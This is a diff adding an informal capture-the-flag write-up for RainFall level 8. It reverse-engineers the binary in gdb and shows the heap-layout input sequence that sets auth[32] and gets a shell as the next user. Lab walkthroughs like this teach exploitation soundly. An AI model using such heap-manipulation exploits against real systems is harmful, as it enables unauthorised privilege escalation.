@@ -1,0 +1,80 @@
+level 8
+
+like always we have we have an executable level8 that ask for input in a loop
+
+lets debug using gdb
+
+first thing we have 2 global variables auth and services
+
+lets debug the main function :
+
+create a buffer 128 in size after that we have an infinite loop that prints the address of the two variables auth and service
+first condition : then use fgets to get an input if we dont give anything it breaks the loop and return
+second condition : it compares the 5 first char of the  input with "auth " if it matches we allocate 4 to auth using malloc and we put 0 in aut[0]
+then compares the size of the buffer+5 mean the after "auth " if its less or equal to 30 if so it copy the input+5 to auth
+example if we give "auth asdads" as input our auh variable will contains "asdads"
+third condition : it compares the first 5 char of the buffer with "reset" if it matches it use free to free auth
+fourth condition : it compares the first 6 char of the buffer with "service" if it matches it use strdup to copy buffer+7 to the variable service
+example if we give "serviceasdads" as input our service variable will contains "asdads"
+the last consition : it compares the first 5 char of the buffer with "login" if it matches it check auth[32] if its empty if its empty it prints Password: else it calls system("/bin/sh")
+
+so basically we need to put somthing in auth[32]
+first thing we need to get the address of auth and service
+
+(gdb)  b *0x080485f0  #break point after malloc call 
+Breakpoint 1 at 0x80485f0
+(gdb) r
+Starting program: /home/user/level8/level8
+(nil), (nil)
+auth
+
+Breakpoint 1, 0x080485f0 in main ()
+(gdb) x $eax
+0x804a008:	0x00000000
+(gdb)
+
+the address of auth is 0x804a008
+
+now lets get the address of service
+
+(gdb) b *0x080486b0 # break point after strdup call
+Breakpoint 2 at 0x80486b0
+(gdb) c
+Continuing.
+0x804a008, (nil)
+service
+
+Breakpoint 2, 0x080486b0 in main ()
+(gdb) x $eax
+0x804a018:	0x0000000a
+(gdb)
+
+the address of service is 0x804a018
+
+the diff between the 2 addresses is 16
+
+so basically in this examples auth[16] will contain '\n' so we need to add 16 other bytes after service
+
+Continuing.
+0x804a008, 0x804a018
+serviceaaaaaaaaaaaaaaaa
+
+Breakpoint 2, 0x080486b0 in main ()
+(gdb) c
+Continuing.
+0x804a008, 0x804a028
+login
+$
+
+we got shell in gdb now lets try it out 
+
+level8@RainFall:~$ ./level8
+(nil), (nil)
+auth
+0x804a008, (nil)
+serviceaaaaaaaaaaaaaaaa
+0x804a008, 0x804a018
+login
+$ whoami
+level9
+$
